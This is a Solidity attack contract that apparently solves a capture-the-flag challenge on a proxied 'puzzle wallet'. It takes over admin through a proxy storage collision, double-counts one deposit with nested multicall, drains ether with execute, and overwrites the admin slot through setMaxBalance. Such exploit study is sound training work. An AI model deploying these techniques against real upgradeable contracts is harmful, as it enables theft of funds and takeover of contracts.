// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

interface Logic {
    function addToWhitelist(address) external;
    function multicall(bytes[] calldata) external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function setMaxBalance(uint256) external;
}

interface Proxy1 {
    function proposeNewAdmin(address) external;
}

contract HackWallet {
    Logic logicInstance;
    Proxy1 proxyInstance;
    address public gamer;
    constructor(address _instance) public {
        logicInstance = Logic(_instance);
        proxyInstance = Proxy1(_instance);
        gamer = msg.sender;
        callpropNewAdmin();
        callWhitelist();
    }

    function callpropNewAdmin() public {
        proxyInstance.proposeNewAdmin(address(this));
    }

    function callWhitelist() public {
        logicInstance.addToWhitelist(address(this));
    }
    
    bytes4 selector = bytes4(keccak256("deposit()"));

    function callDeposit() public payable {
        require(msg.value == 1 ether, "send at least 1 eth");
        bytes memory data = abi.encodeWithSelector(selector);
        (bool success, ) = address(proxyInstance).call{value: msg.value}(data);
        require(success, "call failed");
    }

    bytes[] arrayFunc = [abi.encodeWithSelector(selector)];
    //bytes[] arrayofFunc = [arrayFunc, arrayFunc];
    bytes4 multicallselector = bytes4(keccak256("multicall(bytes[])"));
    bytes[] multiarray = [abi.encodeWithSelector(multicallselector, arrayFunc), abi.encodeWithSelector(multicallselector, arrayFunc)];


    function callMulticall() public payable {
        require(msg.value >= 0.001 ether, "send at least 1 eth");
        logicInstance.multicall{value: msg.value}(multiarray);
    }

    function callExecute() public payable{
        logicInstance.execute(msg.sender, 0.002 ether, "");
    }

    function callSetMaxBalance() public {
        logicInstance.setMaxBalance(uint256(uint160(msg.sender)));
    }

    receive() external payable{

    }
}